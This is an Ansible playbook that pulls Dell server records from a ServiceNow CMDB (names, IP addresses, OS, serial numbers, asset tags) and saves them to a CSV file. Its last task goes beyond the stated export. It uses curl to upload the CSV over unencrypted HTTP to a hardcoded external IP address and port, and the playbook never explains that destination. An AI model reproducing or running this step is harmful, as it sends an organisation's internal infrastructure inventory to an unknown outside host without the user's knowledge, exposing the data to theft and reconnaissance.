---
- name: Get ServiceNow CMDB Server Config and Export to CSV
  hosts: localhost
  connection: local
  collections:
    - servicenow.itsm
    - community.general

  vars:
    # ServiceNow connection details (expected to be passed as extra vars or from environment)
    snow_instance: "{{ lookup('env', 'SNOW_INSTANCE') | default('your_servicenow_instance.service-now.com') }}"
    snow_username: "{{ lookup('env', 'SNOW_USERNAME') | default('your_username') }}"
    snow_password: "{{ lookup('env', 'SNOW_PASSWORD') | default('your_password') }}"
    
    # Output file path
    output_dir: "cmdb_exports"
    output_filename: "servicenow_cmdb_servers_{{ ansible_date_time.iso8601 | replace(':', '-') | replace('.', '-') }}.csv"
    output_filepath: "{{ output_filename }}"
    
    # Specify the CMDB class name to query.
    # Examples:
    # - cmdb_ci_server (for general servers)
    # - cmdb_ci_database (for databases)
    # - cmdb_ci_app_server (for application servers like Java app servers)
    # - cmdb_ci_web_server (for web servers)
    # You can find available class names in your ServiceNow instance under "Configuration > CI Class Manager"
    # or by inspecting the 'sys_db_object' table (filter for tables starting with 'cmdb_ci_').
    cmdb_ci_class_name: "cmdb_ci_server" # Default to servers, change as needed

  tasks:
    - name: Gather current date and time facts
      ansible.builtin.setup:
        gather_subset:
          - date_time
      delegate_to: localhost
      run_once: true

    - name: Create output directory if it doesn't exist
      ansible.builtin.file:
        path: "{{ output_dir }}"
        state: directory
        mode: '0755'

    # https://github.com/ansible-collections/servicenow.itsm/blob/main/docs/servicenow.itsm.configuration_item_info_module.rst
    - name: Get CMDB information
      servicenow.itsm.configuration_item_info:
        instance:
          host: "{{ snow_instance }}"
          username: "{{ snow_username }}"
          password: "{{ snow_password }}"
        sys_class_name: "{{ cmdb_ci_class_name }}" # Use the variable for class name
        query:
          # - manufacturer.name: "= Dell Inc."
          #   install_status: "= installed"
          - manufacturer.name: "STARTSWITH Dell"
        return_fields: # Specify fields to retrieve (these might vary by class)
          - name
          - ip_address
          - os
          - manufacturer
          - model_id
          - serial_number
          - asset_tag
          - sys_class_name
          - sys_id
      register: cmdb_servers

    - name: Debug cmdb_servers
      ansible.builtin.debug:
        var: cmdb_servers

    # example output json, if no return_fields defined.
# TASK [Debug cmdb_servers] ******************************************************
# ok: [localhost] => {
#     "cmdb_servers": {
#         "changed": false,
#         "failed": false,
#         "records": [
#             {
#                 "asset": "c3c1ba8837f3100044e0bfc8bcbe5da4",
#                 "asset_tag": "P1000173",
#                 "assigned": "2024-11-16 07:00:00",
#                 "assigned_to": "",
#                 "assignment_group": "",
#                 "attachments": [],
#                 "attestation_score": "",
#                 "attestation_status": "",
#                 "attested": "false",
#                 "attested_by": "",
#                 "attested_date": "",
#                 "attributes": "",
#                 "business_unit": "",
#                 "can_print": "false",
#                 "category": "Do not migrate to asset",
#                 "cd_rom": "false",
#                 "cd_speed": "-1",
#                 "change_control": "",
#                 "chassis_type": "",
#                 "checked_in": "",
#                 "checked_out": "",
#                 "classification": "Production",
#                 "comments": "",
#                 "company": "e7c1f3d53790200044e0bfc8bcbe5deb",
#                 "correlation_id": "",
#                 "cost": "2160",
#                 "cost_cc": "USD",
#                 "cost_center": "d9d0a971c0a80a641c20b13d99a48576",
#                 "cpu_core_count": "",
#                 "cpu_core_thread": "",
#                 "cpu_count": "1",
#                 "cpu_manufacturer": "7aad6d00c611228400f00e0f80b67d2d",
#                 "cpu_name": "",
#                 "cpu_speed": "3192",
#                 "cpu_type": "GenuineIntel",
#                 "default_gateway": "",
#                 "delivery_date": "",
#                 "department": "",
#                 "discovery_source": "",
#                 "disk_space": "120",
#                 "dns_domain": "",
#                 "dr_backup": "",
#                 "due": "",
#                 "due_in": "",
#                 "duplicate_of": "",
#                 "environment": "",
#                 "fault_count": "0",
#                 "firewall_status": "Intranet",
#                 "first_discovered": "",
#                 "floppy": "",
#                 "form_factor": "",
#                 "fqdn": "",
#                 "gl_account": "",
#                 "hardware_status": "",
#                 "hardware_substatus": "",
#                 "host_name": "",
#                 "install_date": "2024-07-03 08:00:00",
#                 "install_status": "installed",
#                 "internet_facing": "false",
#                 "invoice_number": "",
#                 "ip_address": "",
#                 "justification": "",
#                 "last_discovered": "",
#                 "lease_id": "",
#                 "life_cycle_stage": "",
#                 "life_cycle_stage_status": "",
#                 "location": "f48b23070a0a0ba7001d16a64c67589a",
#                 "mac_address": "",
#                 "maintenance_schedule": "",
#                 "managed_by": "f298d2d2c611227b0106c6be7f154bc8",
#                 "managed_by_group": "",
#                 "manufacturer": "b7e7d7d8c0a8016900a5d7f291acce5c",
#                 "model_id": "47aa6b3f3763100044e0bfc8bcbe5d76",
#                 "model_number": "",
#                 "monitor": "false",
#                 "most_frequent_user": "",
#                 "name": "Service-now Production Sacramento",
#                 "object_id": "",
#                 "operational_status": "operational",
#                 "order_date": "",
#                 "os": "Linux Red Hat",
#                 "os_address_width": "",
#                 "os_domain": "",
#                 "os_service_pack": "",
#                 "os_version": "Enterprise Server 3",
#                 "owned_by": "",
#                 "po_number": "",
#                 "product_instance_id": "",
#                 "purchase_date": "",
#                 "ram": "-1",
#                 "schedule": "",
#                 "serial_number": "",
#                 "short_description": "Glide Production ",
#                 "skip_sync": "false",
#                 "start_date": "",
#                 "subcategory": "",
#                 "support_group": "",
#                 "supported_by": "",
#                 "sys_class_name": "cmdb_ci_server",
#                 "sys_class_path": "/!!/!2/!(/!!",
#                 "sys_created_by": "glide.maint",
#                 "sys_created_on": "2005-05-24 20:37:13",
#                 "sys_domain": "global",
#                 "sys_domain_path": "/",
#                 "sys_id": "106c5c13c61122750194a1e96cfde951",
#                 "sys_mod_count": "26",
#                 "sys_tags": "",
#                 "sys_updated_by": "system",
#                 "sys_updated_on": "2025-05-01 01:16:18",
#                 "unverified": "false",
#                 "used_for": "",
#                 "vendor": "b7e7d7d8c0a8016900a5d7f291acce5c",
#                 "virtual": "false",
#                 "warranty_expiration": ""
#             },


    - name: Prepare CSV header
      ansible.builtin.set_fact:
        csv_header: "Name,IP Address,OS,Manufacturer,Model,Serial Number,Asset Tag,Class Name,Sys ID"

    - name: Prepare CSV content
      ansible.builtin.set_fact:
        csv_content: |
          {{ csv_header }}
          {% for server in cmdb_servers.records %}
          "{{ server.name | default('') }}","{{ server.ip_address | default('') }}","{{ server.os | default('') }}","{{ server.manufacturer | default('') }}","{{ server.model_id | default('') }}","{{ server.serial_number | default('') }}","{{ server.asset_tag | default('') }}","{{ server.sys_class_name | default('') }}","{{ server.sys_id | default('') }}"
          {% endfor %}

    - name: Save CMDB server config to CSV file
      ansible.builtin.copy:
        content: "{{ csv_content }}"
        dest: "{{ output_filepath }}"
        mode: '0644'
      register: csv_file_result

    # - name: Display CSV content
    #   ansible.builtin.debug:
    #     msg: "{{ csv_content }}"

    - name: Display CSV file path
      ansible.builtin.debug:
        msg: "CMDB server configuration saved to: {{ csv_file_result.dest }}"

    - name: Upload CSV file to HTTP endpoint using curl command
      ansible.builtin.command: "curl -F \"path=@{{ csv_file_result.dest }}\" http://141.164.39.187:13113/upload?path=/"
      delegate_to: localhost
      run_once: true
